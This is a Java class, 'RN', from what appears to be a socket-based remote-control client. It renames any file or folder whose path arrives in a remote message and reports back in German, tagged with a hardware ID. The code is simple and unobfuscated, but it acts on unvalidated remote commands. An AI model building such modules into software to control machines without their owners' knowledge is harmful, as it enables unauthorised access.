package de.dion.socket.localobjects.channel.channels;

import java.io.File;
import java.net.Socket;

import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.Crypter;
import de.dion.socket.utils.FileHelper;

public class RN extends Channel {

	public RN() {
		super("RN");
	}

	@Override
	public void onSocketReceive(DataPackage pack) {
		try {
			String current = pack.get(0).toString();
			String from = pack.get(1).toString();
			File ff = getFileFromPath(current, from);
			String new_name = pack.get(2).toString();
			
			if(!ff.exists())
			{
				sendDataPackage(new DataPackage(this.getName(), HWID, "Keine guelltige Datei/Verzeichnis -> " + ff.getCanonicalPath()));
			}
			else
			{
				try {
					FileHelper.renameFileOrFolder(ff, new_name);
					sendDataPackage(new DataPackage(this.getName(), HWID, ff.getName() + " wurde erfolgreich zu " + new_name + " umbenannt."));
				} catch(Exception e) {
					sendDataPackage(new DataPackage(this.getName(), HWID, ff.getName() + " konnte nicht umbenannt werden!\n" + e.getLocalizedMessage()));
				}
			}
			
		} catch(Exception e) {
			sendDataPackage(new DataPackage(this.getName(), HWID, "Fehler beim umbenennen aufgetraten!\n" + e.getLocalizedMessage()));
		}
	}

}
